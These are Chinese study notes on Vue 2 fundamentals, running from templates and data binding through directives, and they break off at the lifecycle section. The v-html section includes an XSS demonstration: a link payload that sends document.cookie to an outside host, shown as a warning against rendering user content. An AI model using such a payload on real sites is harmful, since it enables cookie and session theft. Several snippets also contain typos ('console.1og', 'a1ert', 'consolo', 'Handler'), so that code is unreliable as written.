# 1.基础
### 1.1 初始vue
+ 如果多个容器对应一个实例，只有第一个容器会被实现
+ 如果一个容器对应多个实例，只有第一个实例可以应用
+ 所以要一一对应

```vue
    <div id="root">
        <h1>姓名：{{name}}，年龄：{{age}}</h1>
    </div>
    <script src="../vue2.js/vue.js"></script>
    <script>
        const x = new Vue ({
            el: '#root',  //el是用来绑定容器的
            data: {
                name: 'zff',
                age: '20'
            }
        })
    </script>
```

### 1.2 模板语法
1. 插值语法：

功能：用于解析标签体内容。

写法：{(xxx}},xxx是js表达式，且可以直接读取到data中的所有属性。

2. 指令语法：

功能：用于解析标签（包括：标签属性、标签体内容、绑定事件等），且可以直接读取到data中的所有属性。

举例：v-bind:href="xxx”或简写为：href="xxx",xxx同样要写js表达式



拓：当data内容重复时，可以改变上下级关系，来使两者都可以使用

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698197734548-a4ff7752-54b2-4a5f-a15e-be14e79fa4b0.png)

### 1.3 数据绑定
#### 单向绑定v-bind
单向绑定(v-bind):数据只能从data流向页面。

#### 双向绑定v-model
双向绑定(v-model):数据不仅能从data流向页面，还可以从页面流向data。

v-model:value可以简写为:value



v-model的三个修饰符(主要用在收集表单数据-1.15节)：

+ lazy：失去焦点再收集数据
+ number：输入字符串转为有效的数字
+ trim：输入首尾空格过滤

注意：

+ v-model只能应用在表单类元素（输入类元素/有value值）
+ v-model:value="name"可以简写为v-model="name"

### 1.4 el和data的两种写法
#### el-mount
除了在new Vue的内部el:'#root'，也可以在外部用v.$mount('#root')，后者是挂载，更为灵活，比如可以在计时器中使用

#### data
+ 对象写法 data:{}
+ 函数写法 data:function(){return{}}
    - 必须要有return返回变量的值
    - 通常使用在组件化中
    - 内部的this指的是vue实例对象
    - 当写成箭头函数时，this指的是window，所以一般不写成箭头函数
    - 通常也可以简写成data(){return{}}

### 1.5 Vue借鉴的MVVM模型
M-V-VM

+ M：模型，对应data中的数据
+ V：视图，模板
+ VM：视图模型，Vue实例对象

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698235508474-f610c83a-99f8-4375-a731-9a5b03a05772.png)

### 1.6 数据代理
#### 回顾Object.defineProperty
通过该方法添加的key是无法枚举的（无法被遍历）

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236064174-fb23558c-e51c-4849-b14a-0b4b36452a23.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236154278-6a5d0666-0f83-4d9e-89c9-8aa7d49c4e35.png)



如果想让其枚举，就需要用enumerble（默认值是false）

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236276540-b7a615d6-a12b-4c3e-8c5a-4b1442016489.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236288724-e01c9fc3-9a46-40af-b133-1176d31e4eac.png)



想让其可以修改，就加上writable：true

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236497710-4bac7fbe-733e-4b48-a5b2-f6c8ea34b9ed.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236474439-4e6fa17c-583b-49fc-8fe5-bf3eafc78ef9.png)

想让其可以被删掉，加上configurable:true



当在外部定义变量，引用到内部后，再修改变量的值，内部的值不会随之改变

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236698735-27599bf2-ca01-4d78-bd90-80c0401bba1c.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236763401-8ae33fa3-8e29-4e08-a933-b52b6807875e.png)

想要解决这个问题，就需要引用Get方法

get：当有人读取XX对象的xx属性时，get函数(getter)就会被调用，且返回值为xx的值

当有人读取对象的persion的age属性时，get就会被调用，且返回值为age的值

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236965071-33761cac-e1ab-4bce-9e92-4277ac217603.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698236982139-eb25f99e-b997-4741-8839-d82a108ad402.png)

类似的方法还有Set

set：当有人修改XX对象的xx属性时，set函数(setter)就会被调用，且返回值为xx的值

如下图所示这样，就可以让number和person完全绑定在一起

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698237293147-841ad589-82e8-4ea8-af53-1f87aa63204d.png)

#### 数据代理
定义：通过一个对象代理，对另一个对象中属性的操作(读写)

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698237513347-7cf4728c-11f9-4c3f-bb3b-138d49ee5c23.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698237546968-8112b671-15b7-48a9-8466-b2223163abbb.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698237570410-ca45575a-8f23-4f92-82d6-e5294e29603e.png)

#### Vue中的数据代理
在data对象中定义变量时，就默认为变量设置了对应的getter和setter，当访问或修改vm.name或vm.address时，实际上就是在调用data中对应变量的getter和setter方法，从而完成对name和address的读写

data是未定义的，但是在vm中有定义过的vm._data，其内部存了name和address

 ![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698237988733-82e015b7-ddcc-4294-87ab-00613145557f.png)

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698237855447-2eb5c1fa-0ba9-4ac2-b61e-f2bfa386044e.png) 

### 1.7 事件处理methods
#### v-on和methods
在Vue实例中有methods，和data一样是个对象，methods:{}，在{}中可以指定一些方法，并通过v-on绑定到容器上

```vue
<div id="root">
<button v-on:click="showInfo">点我提示信息</button>
</div>

<script type="text/javascript">
const vm = new Vue({
	el:'#root',
	data:{
		name:'尚硅谷'
	},
	methods:{
		showInfo(event){
			console.log(event.target.innerText)
			console.1og(this)
 			a1ert('同学你好')
    }
  }
})
</script>
```

+ 在showInfo方法里的this是vm，但是用箭头函数定义时This是window
+ v-on：click="showInfo"   可以简写为   @click="showInfo”
+ showinfo实际上还是在vm上，但是并不是数据代理，只有在data中才有数据代理

showinfo（）{}，()括号内默认是event，但是也可以传递参数，只需要在容器的showinfo后加上（参数），然后把实例的event改成对应的变量名即可

```vue
<button v-on:click="showInfo(180)">点我提示信息</button>

methods:{
		showInfo(height){
      	console.log(height)
    }
```

如果想要event，那就showinfo(180,$event),然后设置一个变量来接收ebent，180和$event的顺序无所谓，但是要注意和实例的变量对应

```vue
<button v-on:click="showInfo(180,$event)">点我提示信息</button>

methods:{
		showInfo(height,a){
      	console.log(height)
    }
```

#### 事件修饰符
用来对事件的修饰(管理)，常见的事件修饰符有：

1. prevent：阻止默认事件（常用）
2. stop：阻止事件冒泡（常用），用在子元素身上
3. once：事件只触发一次（常用）
4. capture：使用事件的捕获模式，用在父元素上
5. self：只有event.target是当前操作的元素是才触发事件
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕

```vue
<a href="name.com" @click.prevent="shouwinfo">Name网站</a>
```

### 1.8 键盘事件
当需要监听键盘按键的时间时，可以让按键绑定到容器上，比如@keydown.enter=“showinfo”。

+ Vue中常用的按键别名：
    - 回车enter
    - 删除delete(捕获“删除”和“退格”键)
    - 退出esc
    - 空格space
    - 换行tab，很特殊，只能绑定keydown
    - 上up
    - 下down
    - 左left
    - 右right
+ Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case(短横线命名)，如caps-lock、
+ 系统修饰键（用法特殊）：ctrl、alt、shift、meta(win键)
    - 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
    - 配合keydown使用：正常触发事件。
+ 也可以使用keyCode去指定具体的按键（不推荐）
+ Vue.config.keyCodes.自定义键名=键码，可以去定制按键别名

### 1.9 计算属性compuuted
和data、methods一样，实例中还有计算属性computed:{...},要用的属性不存在，要通过已有属性计算得来。

原理：底层借助了Objcet.defineproperty方法提供的getter和setter。

get函数什么时候执行？

+ 初次读取时会执行一次。
+ 当依赖的数据发生改变时会被再次调用。

优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。

计算属性和fullname方法都在vm上，直接读取使用即可。

如果计算属性要被修改，那必须写set函数去响应修改，且set中，要引起计算时所依赖的数据发生改变

```vue
const vm = new Vue({
  el:'root',
  data:{},
  methods:{},
  computed:{
    fullName:{
      get(){return ...},
      set(value){...}
    }
  }
})
```

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698309618665-991941b1-df60-4eba-a7df-0b75f9dc475f.png)

如果只有get，computed有简写方法

```vue
computed:{
  fullName(){    //相当于getter
    return ...
  }
}
```

### 1.10 监视属性watch
和data/computed一样，监视属性watch:

+ 当被监视的属性变化时，回调函数自动调用，进行相关操作
+ 监视的属性必须存在，才能进行监视
+ 监视的两种写法：
    - new Vue时传入watch配置
    - 通过vm.$watch监视
+ 有handle函数、immediate参数

```vue
const vm =new Vue{
  	el:'#root',
		data:{
  		isHot:ture
		},
		computed:{
  		info(){
  	  	return this.isHot ? '炎热' : '凉爽'
 		  }
		},
		watch:{
  		isHot:{
  				immediate:true
   			  //默认是false，初始化时就调用handler函数
    			Handler(newValue,oldValue){
  						consolo.log(newValue,oldValue)
      	    }
    				//handler函数在isHot发生改变时调用
     		 	 //有两个参数可选：新的值newValue,旧的值oldValue
    	}
		}  
}

或者写成如下格式
  vm.$watch('isHot',{
  		Handler(newValue,oldValue){ consolo.log(newValue,oldValue)}, 
    	immediate:true
  })
```

深度监视：

+ Vue中的watch默认不监测对象内部值的改变（一层）。
+ 配置deep:true可以监测对象内部值改变（多层）。

备注：

+ Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
+ 使用watch时根据数据的具体结构，决定是否采用深度监视。

```vue
'numbers.a':{
		handler(){
			console.1og('a被改变了')
    }
}
  
numbers:{
	deep:true,
	handler(){
		console.1og('numbers改变了')
  }
}
```

监视的简写形式

```vue
isHot:{
    Handler(newValue,oldValue){
    		consolo.log(newValue,oldValue)
    }
//简写：
isHot(newValue,oldValue){
  	console.log('isHot被修改了',newValue,oldValue)
}

//或者是如下，但是不能配置immediate和deep，也不能写箭头函数
vm.$watch('isHot',function(newValue,oldValue){
    console.log('isHot被修改了',newValue,oldValue)
})
```

### 1.11 绑定样式
#### class
字符串写法，适用于“样式的类名不确定，需要动态指定”

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698651677768-5b23b596-4762-4241-be75-7c03c0643c08.png)

数组写法，适用于“要绑定的样式个数和名字都不确定”

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698652139434-88f0cc08-7a9d-498b-8e50-8a8ddaa1b466.png)

对象写法，适用于“要绑定的样式个数确定，名字不确定，但要动态决定用不用”

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698652331651-fd5cfbc3-1be9-4a39-847f-6d3c1ab74af0.png)

#### style
![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698652526829-b588d3d3-7adb-43ba-b979-52aa82a633fc.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698652584679-385586d9-e28b-4731-906b-0c8e056a4778.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698652574548-18981d38-3848-433a-933d-93f6c1f55d63.png)

### 1.12 条件渲染
#### v-if
写法：

1. v-if="表达式”
2. v-else-if="表达式"
3. v-else=表达式"

适用于：切换频率较低的场景。

特点：不展示的DOM元素会被直接被移除。

注意：v-if可以和：v-else-if、v-else一起使用，但要求必须连在一起，结构不能被“打断”

```vue
<div v-if="n === 1">Angular</div>
<div v-else-if="n === 2">React</div>
<div v-else>Vue</div>
```

#### v-show
写法：v-show="表达式”

适用于：切换频率较高的场景。

特点：不展示的DOM元素不会被移除，仅仅是使用样式隐藏掉

使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

### 1.13 列表渲染
#### v-for
用于展示列表数据

语法：v-for="(item,index)in xxx":key="yyy"

可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1698654717225-ae47210e-55a8-4ce0-bd4a-d4909e2e1e4d.png)

#### key的原理
##### 前置知识
就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。

虚拟dom有啥用？每次vm._data 中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。

##### 啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM？
webkit 渲染引擎工作流程图

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699249164546-6ac3efa9-9ca7-414a-949e-96fc3bd36eeb.png)

所有的浏览器渲染引擎工作流程大致分为5步：创建 DOM 树 —> 创建 Style Rules -> 构建 Render 树 —> 布局 Layout -—> 绘制Painting。

1. 构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。
2. 生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；
    - 渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：
        * css优先：引入顺序上，css资源先于js资源
        * js后置：js代码放在底部，且js应尽量少影响DOM构建
3. 构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。
4. 渲染布局：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。
5. 渲染树绘制：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。



注意：

1. DOM 树的构建是文档加载完成开始的？ 构建 DOM 树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 HTML 文档解析完成之后才开始构建 render 树和布局。
2. Render 树是 DOM 树和 CSS 样式表构建完毕后才开始构建的？ 这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。
3. CSS 的解析注意点？ CSS 的解析是从右往左逆向解析的，嵌套标签越多，解析越慢。
4. JS 操作真实 DOM 的代价？传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实DOM的性能特别差。

虚拟 DOM 的好处

+ 虚拟 DOM 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 DOM 的动作，虚拟 DOM 不会立即操作 DOM，而是将这 10 次更新的 diff 内容保存到本地一个 JS 对象中，最终将这个 JS 对象一次性 attch 到 DOM 树上，再进行后续操作，避免大量无谓的计算量。
+ 所以，用 JS 对象模拟 DOM 节点的好处是，页面的更新可以先全部反映在 JS 对象(虚拟 DOM )上，操作内存中的 JS 对象的速度显然要更快，等更新完成后，再将最终的 JS 对象映射成真实的 DOM，交由浏览器去绘制。
+  虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。
+  回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了 tag、props、children 三个属性。

##### 虚拟DOM中key的作用
key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

+ 旧虚拟DOM中找到了与新虚拟DOM相同的key：
    - 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
    - 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
+ 旧虚拟DOM中未找到与新虚拟DOM相同的key
    - 创建新的真实DOM，随后渲染到到页面。

#### 用index作为key可能会引发的问题
若对数据进行：逆序添加、逆序删除等破坏顺序操作：

会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

#### 结论
+ 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
+ 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的

### 1.14 vue监测data中的数据
#### 监测
将data中的数据进行加工：添加getter和setter,通过Object.defineProperty()方法，然后将加工后的对象传给vm的_data属性

调用 set 方法时，就会去解析模板----->生成新的虚拟 DOM----->新旧DOM 对比 -----> 更新页面

```vue
<script type="text/javascript" >

  let data = {
    name:'尚硅谷',
    address:'北京',
  }

  //创建一个监视的实例对象，用于监视data中属性的变化
  const obs = new Observer(data)		
  console.log(obs)	

  //准备一个vm实例对象
  let vm = {}
  vm._data = data = obs

  function Observer(obj){
    //汇总对象中所有的属性形成一个数组
    const keys = Object.keys(obj)
    //遍历
    keys.forEach((k) => {
      Object.defineProperty(this, k, {
        get() {
          return obj[k]
        },
        set(val) {
          console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
          obj[k] = val
        }
      })
    })
  }
</script>

```

#### Vue.set
向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。

它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 vm.myObject.newProperty = 'hi')

语法：

+ Vue.set(target，propertyName/index，value) 
+ vm.$set(target，propertyName/index，value)

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h1>学生信息</h1>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            student:{
                name:'tom',
                age:18,
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            addSex(){
                Vue.set(this.student,'sex','男')
                this.$set(this.student,'sex','男')//二者选一个即可
            }
        }
    })
</script>

```

有缺陷：对象不能是Vue实例或者Vue实例的根数据对象（即vm和vm_data）。比如上面实例中将sex添加到student上，而不是vm或vm_data。

#### 数组监测
![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699842983836-df00ee3d-32d7-4756-bbf1-008f66db8098.png)

所以我们通过 ，m._data.student.hobby[0] = ‘aaa’，是不奏效的

vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新。

既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？

vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的，如下图：

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699843047292-3390d311-a6e9-4f46-964d-cad87ff34bc1.png)

#### 总结
Vue监视数据的原理：

+ vue会监视data中所有层次的数据
+ 如何监测对象中的数据？
    - 通过setter实现监视，且要在new Vue时就传入要监测的数据。
    - 在对象后直接追加的属性，Vue默认不做响应式处理
    - 如需给后添加的属性做响应式，请使用如下API：
        * Vue.set(target，propertyName/index，value) 或
        * vm.$set(target，propertyName/index，value)
+ 如何监测数组中的数据？
    - 通过包裹数组更新元素的方法实现，本质就是做了两件事：
        * 调用原生对应的方法对数组进行更新
        * 重新解析模板，进而更新页面
+ 在Vue修改数组中的某个元素一定要用如下方法：
    - 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
    - Vue.set() 或 vm.$set()
        * Vue.set() 和 vm.$set() 不能给vm或vm的根数据对象添加属性

### 1.15 收集表单数据
#### 收集用户输入的value
Input type="text"/"password"

若“： ”，则v-model收集的是用户输入的value值

```vue
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                account:'',
                password:'',
                age:18,
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

#### 收集用户选择的value
input type="checkbox"

若“： ”，则v-model收集的是用户选择的value值，前提是要给标签配置value值。

如下，v-model收集的是用户选择的value="male"/"female"（代码5、6行）

```vue
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                sex:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>

```

#### 收集用户选择多选框的value
+ 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+ 配置了input的value属性:
    - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - v-model的初始值是数组，那么收集的的就是value组成的数组

如下，city收集的是布尔值，hobby收集的是value组成的数组，agree收集的是布尔值

```vue
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                hobby:[],
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>

```

### 1.16 过滤器
定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

语法：

+ 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
+ 使用过滤器：
    - {{ xxx | 过滤器名}} 
    - v-bind:属性 = “xxx | 过滤器名”

注意：dayjs(timeA).format(B)的意思是按照B的格式输出时间A

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{ fmtTime }}</h3>
    <!-- methods实现 -->
    <h3>现在是：{{ getFmtTime() }}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>
    <!-- 过滤器实现（传参） -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
    <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({
        el:'#root',
        data:{
            time:1621561377603, //时间戳
            msg:'你好，尚硅谷'
        },
        computed: {
            fmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        methods: {
            getFmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        //局部过滤器
        filters:{
            timeFormater(value, str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            }
        }
    })
</script>

```

### 1.17 内置指令
#### v-text
使用频率：较低

作用：向其所在的节点中渲染文本内容。

与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```vue
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name">你好</div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>'
        }
    })
</script>
```

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699845691550-068d441f-2937-4a6f-96c6-a367bbc6f5de.png)

#### v-html
作用：向指定节点中渲染包含html结构的内容。

与插值语法的区别：

+ v-html会替换掉节点中所有的内容，{{xx}}则不会。
+ v-html可以识别html结构。

严重注意：v-html有安全性问题！！！！

+ 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+ 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```vue
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str">1111111111</div>
    <div v-html="str2">1111111111</div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699845837993-d3ad3a3d-4883-486d-8e0f-a35e3d9f6983.png)

#### v-cloak
+ 作用是让页面加载，隐藏后页面在加载好之前不会显示{{}}等语法
+ 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+ 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

```vue
<style>
    [v-cloak]{
        display:none;
    }
</style>
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
```

#### v-once
+ v-once所在节点在动态渲染一次后，就视为静态内容了。
+ 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{ n }}</h2>
    <h2>当前的n值是:{{ n }}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

#### v-pre
+ 跳过其所在节点的编译过程
+ 可利用它跳过没有使用指令语法、没有使用插值语法的节点，会加快编译

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 >当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

### 1.18 自定义指令
+ 需要使用属性directives:{xxx:{}},xxx为自定义的指令名
+ 比如big:{}，但是在使用时需要写成v-big；
+ xxx:{}也可以写成函数"xxx:function(){}"/"xxx(){}"；
+ 指令名也可以写成'big-number'的形式('xxx-xxx')

#### 函数式
+ 函数写法可以接受参数，分别是element和binding(绑定对象)，即big(element,binding){}
+ 函数式自定义指令什么时候使用：
    - 指令与元素成功绑定时（一上来）
    - 指令所在的模板被重新解析时

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

```vue
directives: {
        big (element,binding){
            console.log('big',this) 
            element.innerText = binding.value * 10
				}
}
```

```vue
Vue.directive('big', {
      console.log('big',this)//注意此处的this是window
      element.innerText = binding.value * 10
}
```

#### 对象式
对象式：”xxx:{...}“

{...}常用的有3个函数

+ bind：指令与元素成功绑定时调用。
+ inserted：指令所在元素被插入页面时调用。
+ update：指令所在模板结构被重新解析时调用。
+ 这三个函数都有element和binding参数

需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

```vue
new Vue({
    directives: {
        fbind: {
            //指令与元素成功绑定时（一上来）
            bind (element,binding){
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted (element,binding){
                element.focus()
            },
            //指令所在的模板被重新解析时
            update (element,binding){
                element.value = binding.value
            }
        }
    }
})
```

```vue
Vue.directive('fbind', {
        // 指令与元素成功绑定时（一上来）
        bind(element, binding){
            element.value = binding.value
        },
        // 指令所在元素被插入页面时
        inserted(element, binding){
            element.focus()
        },
        // 指令所在的模板被重新解析时
        update(element, binding){
            element.value = binding.value
        }
}
```

### 1.19 生命周期
Vue 实例有⼀个完整的生命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom --> 渲染、更新 --> 渲染、卸载 等⼀系列过程，称为Vue的生命周期![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699864423507-9857c061-341c-440d-a8e7-12e9dbf7fbb2.png)

具体过程(图中红色字)：

